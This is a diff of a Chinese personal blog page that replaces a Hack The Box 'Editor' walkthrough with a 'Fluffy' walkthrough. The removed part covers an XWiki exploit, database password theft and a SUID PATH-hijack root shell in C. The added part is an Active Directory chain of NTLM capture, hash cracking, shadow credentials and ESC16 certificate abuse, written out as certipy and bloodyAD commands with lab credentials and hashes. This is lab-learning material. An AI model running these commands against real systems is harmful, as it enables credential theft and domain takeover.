@@ -14,15 +14,15 @@
   <meta name="theme-color">
 
   
-  <title>Editor-htb &middot; IIIIIII的博客</title>
-    <meta name="title" content="Editor-htb &middot; IIIIIII的博客">
+  <title>fluffy-htb &middot; IIIIIII的博客</title>
+    <meta name="title" content="fluffy-htb &middot; IIIIIII的博客">
 
   
   
-  <meta name="keywords" content="Xwiki,">
+  <meta name="keywords" content="windows,ESC16,">
   
   
-  <link rel="canonical" href="https://Starrui777.github.io/posts/editor-htb/">
+  <link rel="canonical" href="https://Starrui777.github.io/posts/fluffy-htb-w/">
   
   
   
@@ -95,31 +95,32 @@
   
 
   
-  <meta property="og:url" content="https://Starrui777.github.io/posts/editor-htb/">
+  <meta property="og:url" content="https://Starrui777.github.io/posts/fluffy-htb-w/">
   <meta property="og:site_name" content="IIIIIII的博客">
-  <meta property="og:title" content="Editor-htb">
+  <meta property="og:title" content="fluffy-htb">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
     <meta property="article:published_time" content="2025-09-02T00:00:00+00:00">
     <meta property="article:modified_time" content="2025-09-02T00:00:00+00:00">
-    <meta property="article:tag" content="Xwiki">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="ESC16">
 
   
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Editor-htb">
+  <meta name="twitter:title" content="fluffy-htb">
 
   <script type="application/ld+json">
   [{
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Posts",
-    "name": "Editor-htb",
-    "headline": "Editor-htb",
+    "name": "fluffy-htb",
+    "headline": "fluffy-htb",
     
     
     "inLanguage": "en",
-    "url" : "https:\/\/Starrui777.github.io\/posts\/editor-htb\/",
+    "url" : "https:\/\/Starrui777.github.io\/posts\/fluffy-htb-w\/",
     "author" : {
       "@type": "Person",
       "name": "IIIIIIIIIIII"
@@ -130,10 +131,10 @@
     
     "dateModified": "2025-09-02T00:00:00\u002b00:00",
     
-    "keywords": ["Xwiki"],
+    "keywords": ["windows","ESC16"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "260"
+    "wordCount": "930"
   }]
   </script>
 
@@ -509,7 +510,7 @@
     <header id="single_header" class="mt-5 max-w-prose">
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Editor-htb
+        fluffy-htb
       </h1>
       <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -562,7 +563,7 @@
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>260 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">2 mins</span>
+      <time datetime="2025-09-02T00:00:00&#43;00:00">2 September 2025</time><span class="px-2 text-primary-500">&middot;</span><span>930 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">5 mins</span>
     
 
     
@@ -586,11 +587,21 @@
         
           
             
-              <a class="relative mt-[0.5rem] mr-2" href="/tags/xwiki/"
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/windows/"
                 ><span class="flex cursor-pointer">
   <span
     class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-    Xwiki
+    Windows
+  </span>
+</span>
+</a
+              >
+            
+              <a class="relative mt-[0.5rem] mr-2" href="/tags/esc16/"
+                ><span class="flex cursor-pointer">
+  <span
+    class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    ESC16
   </span>
 </span>
 </a
@@ -740,11 +751,13 @@
     class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#editor-htb">Editor-htb</a>
+    <li><a href="#fluffy-htb">fluffy-htb</a>
       <ul>
-        <li><a href="#端口扫描8080进去">端口扫描8080进去</a></li>
-        <li><a href="#拿到shell">拿到shell</a></li>
-        <li><a href="#learning">learning</a></li>
+        <li><a href="#nmap扫描">Nmap扫描</a></li>
+        <li><a href="#使用bloodhound来分析域环境">使用bloodhound来分析域环境</a></li>
+        <li><a href="#影子攻击">影子攻击</a></li>
+        <li><a href="#esc16">ESC16</a></li>
+        <li><a href="#整体攻击逻辑核心链">整体攻击逻辑（核心链）</a></li>
       </ul>
     </li>
   </ul>
@@ -760,11 +773,13 @@
     class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#editor-htb">Editor-htb</a>
+    <li><a href="#fluffy-htb">fluffy-htb</a>
       <ul>
-        <li><a href="#端口扫描8080进去">端口扫描8080进去</a></li>
-        <li><a href="#拿到shell">拿到shell</a></li>
-        <li><a href="#learning">learning</a></li>
+        <li><a href="#nmap扫描">Nmap扫描</a></li>
+        <li><a href="#使用bloodhound来分析域环境">使用bloodhound来分析域环境</a></li>
+        <li><a href="#影子攻击">影子攻击</a></li>
+        <li><a href="#esc16">ESC16</a></li>
+        <li><a href="#整体攻击逻辑核心链">整体攻击逻辑（核心链）</a></li>
       </ul>
     </li>
   </ul>
@@ -786,39 +801,28 @@
 
         <div class="article-content max-w-prose mb-20">
           
-<h2 class="relative group">Editor-htb 
-    <div id="editor-htb" class="anchor"></div>
+<h2 class="relative group">fluffy-htb 
+    <div id="fluffy-htb" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#editor-htb" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#fluffy-htb" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
 <!-- more --> 
+<p>给了一个账号</p>
+<p>j.fleischman / J0elTHEM4n1990!</p>
 
-<h3 class="relative group">端口扫描8080进去 
-    <div id="端口扫描8080进去" class="anchor"></div>
+<h3 class="relative group">Nmap扫描 
+    <div id="nmap扫描" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e7%ab%af%e5%8f%a3%e6%89%ab%e6%8f%8f8080%e8%bf%9b%e5%8e%bb" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#nmap%e6%89%ab%e6%8f%8f" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>┌──(root㉿kali)-[~]
-└─# nmap 10.10.11.80<br>
-Starting Nmap 7.92 ( <a
-  href="https://nmap.org"
-    target="_blank"
-  >https://nmap.org</a> ) at 2025-09-02 12:19 CST
-Nmap scan report for editor.htb (10.10.11.80)
-Host is up (1.3s latency).
-Not shown: 997 closed tcp ports (reset)
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-8080/tcp open  http-proxy</p>
 <p>
 
 
@@ -827,16 +831,66 @@ PORT     STATE SERVICE
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/1.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/n.png">
 
   
 </figure>
 </p>
-<p>发现是一共XWIKI用POC打</p>
+<pre tabindex="0"><code>添加到hosts里
+10.10.11.69 DC01.fluffy.htb  fluffy.htb   添加hosts
+</code></pre><pre tabindex="0"><code>登录 SMB 服务后，工具会自动尝试从 RID 1000 开始递增枚举（通常域用户 RID 从 1000 起），向域控发送查询请求，获取每个 RID 对应的 用户名、组名或计算机名。
+crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990 --shares 枚举smb共享目录信息  
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/1.1.png">
+
+  
+</figure>
+</p>
+<p>选中SidtypeUser组 以\分割 选中第二部分 不选择空格 放到users.txt中</p>
+<p>crackmapexec smb 10.10.11.69 -u j.fleischman -p J0elTHEM4n1990! &ndash;rid-brute | grep &ldquo;SidTypeUser&rdquo; | awk -F &lsquo;\&rsquo; &lsquo;{print $2}&rsquo; | awk &lsquo;{print $1}&rsquo; &gt; users.txt</p>
+<p>试一下密码喷射发现不行</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/1.2.png">
+
+  
+</figure>
+</p>
+<pre tabindex="0"><code>进入SMB目录寻找讯息
+
+这里有一个PDF 我们打开提示了 CVE信息
+
+CVE-2025-24071_PoC-main
+</code></pre><p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/pdf.png">
+
+  
+</figure>
+</p>
 <p><a
-  href="https://github.com/hackersonsteroids/cve-2025-24893"
+  href="https://github.com/0x6rss/CVE-2025-24071_PoC/"
     target="_blank"
-  >hackersonsteroids/cve-2025-24893: Modified exploit for CVE-2025-24893</a></p>
+  >https://github.com/0x6rss/CVE-2025-24071_PoC/</a></p>
 <p>
 
 
@@ -845,21 +899,53 @@ PORT     STATE SERVICE
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/2.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/1.3.png">
 
   
 </figure>
 </p>
+<p>python poc.py
+└─# python poc.py<br>
+Enter your file name: exp
+Enter IP (EX: 192.168.1.162): 10.10.16.9
+completed</p>
+<p>放入生成的文件</p>
+<p>drw-rw-rw-          0  Tue Sep  2 21:39:52 2025 .</p>
+<p>drw-rw-rw-          0  Tue Sep  2 21:39:52 2025 ..</p>
+<p>drw-rw-rw-          0  Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64</p>
+<p>-rw-rw-rw-    1827464  Fri May 16 22:51:49 2025 Everything-1.4.1.1026.x64.zip</p>
+<p>drw-rw-rw-          0  Fri May 16 22:51:49 2025 KeePass-2.58</p>
+<p>-rw-rw-rw-    3225346  Fri May 16 22:51:49 2025 KeePass-2.58.zip</p>
+<p>-rw-rw-rw-     169963  Sat May 17 22:31:07 2025 Upgrade_Notice.pdf</p>
+<p>put exploit.zip  放入文件</p>
+<p>然后监听</p>
+<p>responder -I tun0 -wvF</p>
+<p>
 
-<h3 class="relative group">拿到shell 
-    <div id="拿到shell" class="anchor"></div>
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/1.4.png">
+
+  
+</figure>
+</p>
+<p>我们获得了一个账号密码 用john破解下
+prometheusx-303  (p.agila)</p>
+
+<h3 class="relative group">使用bloodhound来分析域环境 
+    <div id="使用bloodhound来分析域环境" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e6%8b%bf%e5%88%b0shell" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e4%bd%bf%e7%94%a8bloodhound%e6%9d%a5%e5%88%86%e6%9e%90%e5%9f%9f%e7%8e%af%e5%a2%83" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
+<p>bloodhound-python -u j.fleischman -p J0elTHEM4n1990! -k -d fluffy.htb &ndash;zip -c All -dc dc01.fluffy.htb -ns 10.10.11.69 &ndash;dns-tcp</p>
 <p>
 
 
@@ -868,106 +954,11 @@ PORT     STATE SERVICE
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/3.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/1.png">
 
   
 </figure>
 </p>
-<pre tabindex="0"><code>find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name &#34;*config*&#34; -o -name &#34;*.properties&#34; -o -name &#34;*.xml&#34; 2&gt;/dev/null
-查询数据库文件
-
-$ find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name &#34;*config*&#34; -o -name &#34;*.properties&#34; -o -name &#34;*.xml&#34; 2&gt;/dev/null
-/var/lib/xwiki/data/configuration.properties
-/var/lib/xwiki/data/store/file/xwiki/b/f/8fb536bfe96480556241885cb20974/attachments/e/6/d4cbb35779b27121c39efde2a23520/~METADATA.xml
-/var/lib/xwiki/data/store/solr/events_9/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/events_9/core.properties
-/var/lib/xwiki/data/store/solr/extension_index_9/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/extension_index_9/core.properties
-/var/lib/xwiki/data/store/solr/solr.xml
-/var/lib/xwiki/data/store/solr/events/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/events/core.properties
-/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.xml
-/var/lib/xwiki/data/store/solr/search/META-INF/maven/org.xwiki.platform/xwiki-platform-search-solr-server-core/pom.properties
-/var/lib/xwiki/data/store/solr/search/conf/elevate.xml
-/var/lib/xwiki/data/store/solr/search/conf/currency.xml
-/var/lib/xwiki/data/store/solr/search/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/search/core.properties
-/var/lib/xwiki/data/store/solr/search_9/conf/managed-schema.xml
-/var/lib/xwiki/data/store/solr/search_9/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/search_9/core.properties
-/var/lib/xwiki/data/store/solr/extension_index/conf/solrconfig.xml
-/var/lib/xwiki/data/store/solr/extension_index/core.properties
-/var/lib/xwiki/data/extension/history/2025.06.13.xml
-/var/lib/xwiki/data/jobs/status/store.properties
-/var/lib/xwiki/data/jobs/status/3/distribution/log.xml
-/var/lib/xwiki/data/jobs/status/3/solr/indexer/log.xml
-/var/lib/xwiki/data/jobs/status/extension/index/log.xml
-/var/lib/xwiki/data/jobs/status/solr/indexer/log.xml
-/var/lib/xwiki/tmp/start_1826614924204897555.properties
-/etc/xwiki/portlet.xml
-/etc/xwiki/jetty-web.xml
-/etc/xwiki/jetty-ee8-web.xml
-/etc/xwiki/cache/infinispan/config.xml
-/etc/xwiki/hibernate.cfg.xml
-/etc/xwiki/xwiki.properties
-/etc/xwiki/sun-web.xml
-/etc/xwiki/web.xml
-/etc/xwiki/jboss-deployment-structure.xml
-/etc/xwiki/xwiki-tomcat9.xml
-/etc/xwiki/version.properties
-/etc/xwiki/logback.xml
-</code></pre><p>问了下AI 查看这个文件</p>
-<p>$ cat /etc/xwiki/hibernate.cfg.xml</p>
-<pre tabindex="0"><code> &lt;property name=&#34;hibernate.connection.username&#34;&gt;xwiki&lt;/property&gt;
-    &lt;property name=&#34;hibernate.connection.password&#34;&gt;theEd1t0rTeam99&lt;/property&gt;
-    &lt;property name=&#34;hibernate.connection.driver_class&#34;&gt;com.mysql.cj.jdbc.Driver&lt;/property&gt;
-    &lt;property name=&#34;hibernate.dbcp.poolPreparedStatements&#34;&gt;true&lt;/property&gt;
-    &lt;property name=&#34;hibernate.dbcp.maxOpenPreparedStatements&#34;&gt;20&lt;/property&gt;
-    
-    拿到了数据库账号密码   
-</code></pre><pre tabindex="0"><code>查看passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
-systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
-systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
-messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-pollinate:x:105:1::/var/cache/pollinate:/bin/false
-sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
-syslog:x:107:113::/home/syslog:/usr/sbin/nologin
-uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
-tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
-tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
-landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
-fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
-usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
-lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
-dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
-mysql:x:115:121:MySQL Server,,,:/nonexistent:/bin/false
-tomcat:x:998:998:Apache Tomcat:/var/lib/tomcat:/usr/sbin/nologin
-xwiki:x:997:997:XWiki:/var/lib/xwiki:/usr/sbin/nologin
-netdata:x:996:999:netdata:/opt/netdata:/usr/sbin/nologin
-oliver:x:1000:1000:,,,:/home/oliver:/bin/bash
-_laurel:x:995:995::/var/log/laurel:/bin/false
-发现用户oliver
-</code></pre><p>这里数据库密码可以登录</p>
 <p>
 
 
@@ -976,67 +967,273 @@ _laurel:x:995:995::/var/log/laurel:/bin/false
 
 
 <figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/4.png">
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/2.png">
 
   
 </figure>
 </p>
-<p>发现一个suid程序ndsudo</p>
-<p>
+<p>通过上面两个图可以得出</p>
+<p>P.AGILA属于SERVICE管理组 这个组对service account有全部通用权限
+这个serviceaccount 可以管理三个用户</p>
+<p>SERVICE ACCOUNTS 对 ca_svc、ldap_svc、winrm_svc 等账户有 GenericWrite 权限， 这意味着可以向这些账户添加自定义 KeyCredentia</p>
 
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/5.png">
-
-  
-</figure>
-</p>
-<p>这里你执行nvme-list 他会执行 nvme程序 所以我们用变量劫持</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#include &lt;unistd.h&gt;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">int main<span class="o">()</span> <span class="o">{</span>
-</span></span><span class="line"><span class="cl">    setuid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span> setgid<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    execl<span class="o">(</span><span class="s2">&#34;/bin/bash&#34;</span>, <span class="s2">&#34;bash&#34;</span>, NULL<span class="o">)</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> 0<span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span><span class="line"><span class="cl">编译后传上去
-</span></span><span class="line"><span class="cl">scp nvme oliver@10.10.11.80:/tmp
-</span></span><span class="line"><span class="cl">oliver@10.10.11.80<span class="err">&#39;</span>s password:  
-</span></span><span class="line"><span class="cl">nvme 
-</span></span></code></pre></div><p>export PATH=/tmp:$PATH  成功提权</p>
-<p>
-
-
-
-
-
-
-<figure>
-    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/xwiki/6.png">
-
-  
-</figure>
-</p>
-
-<h3 class="relative group">learning 
-    <div id="learning" class="anchor"></div>
+<h3 class="relative group">影子攻击 
+    <div id="影子攻击" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#learning" aria-label="Anchor">#</a>
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#%e5%bd%b1%e5%ad%90%e6%94%bb%e5%87%bb" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<pre tabindex="0"><code>Xwiki POC https://github.com/hackersonsteroids/cve-2025-24893
-find /var/lib/xwiki/ /etc/xwiki/ /opt/xwiki/ -name &#34;*config*&#34; -o -name &#34;*.properties&#34; -o -name &#34;*.xml&#34; 2&gt;/dev/null 搜索
-MySQL/MariaDB /etc/mysql/my.cnf 或 /etc/my.cnf  关键配置文件
-/etc/xwiki/hibernate.cfg.xml  XWiki 企业 wiki 平台核心数据库配置文件，
-export PATH=/tmp:$PATH 追加`/tmp`到 PATH 最前，保留原有路径
-</code></pre>
+<pre tabindex="0"><code>这里提示什么时间就ntpdata同步下和DC的时间 提示权限就重新执行加入组命令
+</code></pre><p><a
+  href="https://github.com/CravateRouge/BloodyAD"
+    target="_blank"
+  >https://github.com/CravateRouge/BloodyAD</a></p>
+<pre tabindex="0"><code>先添加用户到该组获得执行那三个系统用户权限-如果后面提示拒绝就重新运行下这个命令
+
+命令成功运行后，p.agila 用户会被添加到 SERVICE ACCOUNTS 组中，成为该组的成员。
+</code></pre><p>└─# bloodyAD -d fluffy.htb -u p.agila -p &lsquo;prometheusx-303&rsquo; &ndash;dc-ip 10.10.11.69 add groupMember &lsquo;SERVICE ACCOUNTS&rsquo; p.agila</p>
+<p>[+] p.agila added to SERVICE ACCOUNTS  成功添加</p>
+<p>获得winrm用户的hash</p>
+<p>certipy-ad shadow auto -u &lsquo;<a
+  href="mailto:p.agila@fluffy.htb">p.agila@fluffy.htb</a>&rsquo; -p &lsquo;prometheusx-303&rsquo; -account &lsquo;winrm_svc&rsquo; -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/win.png">
+
+  
+</figure>
+</p>
+<p>使用evil登录获得user.flag</p>
+<p>获取ca_svc用户 NTLM hash
+certipy-ad shadow auto -u &lsquo;<a
+  href="mailto:p.agila@fluffy.htb">p.agila@fluffy.htb</a>&rsquo; -p &lsquo;prometheusx-303&rsquo; -account &lsquo;ca_svc&rsquo; -target dc01.fluffy.htb -dc-ip 10.10.11.69</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/ca.png">
+
+  
+</figure>
+</p>
+<p>执行下面寻找有无漏洞命令提示不存在模板需要更新下需要更新版本</p>
+<p>certipy-ad find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</p>
+<p><a
+  href="https://github.com/ly4k/Certipy"
+    target="_blank"
+  >ly4k/Certipy: Tool for Active Directory Certificate Services enumeration and abuse</a></p>
+<p>进去后pip install . 需要python版本&gt;=12  如果python版本不匹配还要下载python 3.12.0.4</p>
+<p>source certipy-3.12-env/bin/activate 激活pip虚拟环境</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/py.png">
+
+  
+</figure>
+</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/ca2.png">
+
+  
+</figure>
+</p>
+<p>certipy find -username ca_svc -hashes :ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.10.11.69 -vulnerable</p>
+<p>发现漏洞ESC16</p>
+<p>
+
+
+
+
+
+
+<figure>
+    <img class="my-0 rounded-md" loading="lazy" alt="1" src="../images/flu/ca3.png">
+
+  
+</figure>
+</p>
+
+<h3 class="relative group">ESC16 
+    <div id="esc16" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100 select-none">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#esc16" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<pre tabindex="0"><code>certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -user &#39;ca_svc&#39; read
+将受害者账户的 UPN 更新为目标管理员的 sAMAccountName。
+certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39;  -upn &#39;administrator&#39;  -user &#39;ca_svc&#39; update
+以 p.agila 身份为 ca_svc 账户添加影子凭据（修改 msDS-KeyCredentialLink 属性），并自动完成证书申请与认证，最终获取 ca_svc 的 NT 哈希或票据。
+certipy shadow -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -account &#39;ca_svc&#39; auto
+
+export KRB5CCNAME=ca_svc.ccache 
+certipy req -k -dc-ip &#39;10.10.11.69&#39; -target &#39;DC01.FLUFFY.HTB&#39; -ca &#39;fluffy-DC01-CA&#39; -template &#39;User&#39;
+还原“受害者”帐户的 UPN。
+certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -upn &#39;ca_svc@fluffy.htb&#39; -user &#39;ca_svc&#39; update
+以目标管理员身份进行身份验证。
+certipy auth -dc-ip &#39;10.10.11.69&#39; -pfx &#39;administrator.pfx&#39; -username &#39;administrator&#39; -domain &#39;fluffy.htb&#39;
+
+ 
+</code></pre><p>1：验证 <code>p.agila</code> 是否对 <code>ca_svc</code> 有基本的读取权限（为后续修改操作铺路）；</p>
+<pre tabindex="0"><code>certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -user &#39;ca_svc&#39; read
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for &#39;ca_svc&#39;:
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : ca_svc@fluffy.htb
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-09-02T15:31:47+00:00
+</code></pre><p>2：将 <code>ca_svc</code> 的 UPN 临时修改为 <code>administrator</code></p>
+<ul>
+<li><strong>UPN（用户主体名称）</strong> 是域用户的唯一标识（格式：<code>用户名@域名</code>），修改为 <code>administrator</code> 后，<code>ca_svc</code> 在证书申请时会被识别为 <code>administrator</code>；</li>
+<li>实际完整格式是 <code>administrator@fluffy.htb</code>），是为了<strong>欺骗证书服务器（CA）</strong>：</li>
+<li>CA 在验证证书申请时，会检查申请者的 UPN 是否符合模板权限。修改后，CA 会误认为是 <code>administrator</code> 本人在申请证书，从而颁发高权限证书，实现 “伪装身份” 的目的。</li>
+</ul>
+<pre tabindex="0"><code>certipy account -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39;  -upn &#39;administrator&#39;  -user &#39;ca_svc&#39; update
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Updating user &#39;ca_svc&#39;:
+    userPrincipalName                   : administrator
+[*] Successfully updated &#39;ca_svc&#39;
+</code></pre><p>3：为 <code>ca_svc</code> 添加影子凭据，获取认证材料</p>
+<p><strong>影子凭据</strong>：通过修改 <code>ca_svc</code> 的 <code>msDS-KeyCredentialLink</code> 属性，添加一个新的密钥对，本质是为 <code>ca_svc</code> 注入一个可控的 “虚拟密码” 生成一个密钥文件</p>
+<pre tabindex="0"><code>certipy shadow -u &#39;p.agila@fluffy.htb&#39; -p &#39;prometheusx-303&#39; -dc-ip &#39;10.10.11.69&#39; -account &#39;ca_svc&#39; auto
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Targeting user &#39;ca_svc&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;7ce9744427f5487f82ef4285adb01852&#39;
+[*] Adding Key Credential with device ID &#39;7ce9744427f5487f82ef4285adb01852&#39; to the Key Credentials for &#39;ca_svc&#39;
+[*] Successfully added Key Credential with device ID &#39;7ce9744427f5487f82ef4285adb01852&#39; to the Key Credentials for &#39;ca_svc&#39;
+[*] Authenticating as &#39;ca_svc&#39; with the certificate
+[*] Certificate identities:
